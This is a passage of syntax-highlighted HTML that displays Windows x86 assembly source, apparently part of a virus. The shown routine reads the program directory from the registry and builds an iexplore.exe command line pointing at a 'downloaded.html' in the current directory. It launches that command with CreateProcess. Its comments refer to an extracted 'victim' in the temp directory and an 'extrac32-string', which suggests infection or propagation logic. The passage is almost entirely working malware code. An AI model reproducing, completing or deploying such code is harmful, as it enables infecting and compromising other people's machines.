        </span><span class="sc5">program_dir_reg_subkey</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">reg_handle</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">RegQueryValueEx</span><span class="sc4">,</span><span class="sc0"> \      </span><span class="sc1">; Read the info</span><span class="sc0">
        </span><span class="sc4">[</span><span class="sc5">reg_handle</span><span class="sc4">],</span><span class="sc0"> \
        </span><span class="sc5">program_dir_reg_value</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">reg_value_type</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">reg_buffer</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">reg_buffer_size</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">RegCloseKey</span><span class="sc4">,</span><span class="sc0"> \                  </span><span class="sc1">; Close reg-key</span><span class="sc0">
        </span><span class="sc4">[</span><span class="sc5">reg_handle</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reg_buffer</span><span class="sc0">
   </span><span class="sc5">SearchEndOfProgramDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchEndOfProgramDir</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reg_buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgramDirLength</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reg_buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgramDirLength</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgramDirLength</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InetPath</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgramDirLength</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InetLength</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgramDirLength</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">InetLength</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgramDirLength</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetCurrentDirectory</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x255</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgramDirLength</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">SearchEndOfCurrentDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchEndOfCurrentDir</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgramDirLength</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgramDirLength</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szFileName</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgramDirLength</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szFileNameLength</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgramDirLength</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szFileNameLength</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateProcess</span><span class="sc4">,</span><span class="sc0"> \            </span><span class="sc1">; Execute the extrac32-string</span><span class="sc0">
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \                  </span><span class="sc1">; Now the extracted version of the victim is in the temp-direcory</span><span class="sc0">
        </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">],</span><span class="sc0"> \           </span><span class="sc1">; '"'+%program-dir%+'\Internet Explorer\iexplore.exe" "'+%current-dir%+'\downloaded.html"'</span><span class="sc0">
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">FALSE</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">STARTUPINFO_struct</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">PROCESS_INFORMATION_struct</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">2500</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EmptyBuffers</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirtualAllocSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">EmptyBuffersLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">EmptyBuffersLoop</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc5">.end</span><span class="sc0"> </span><span class="sc5">start</span></div></body>
</html>
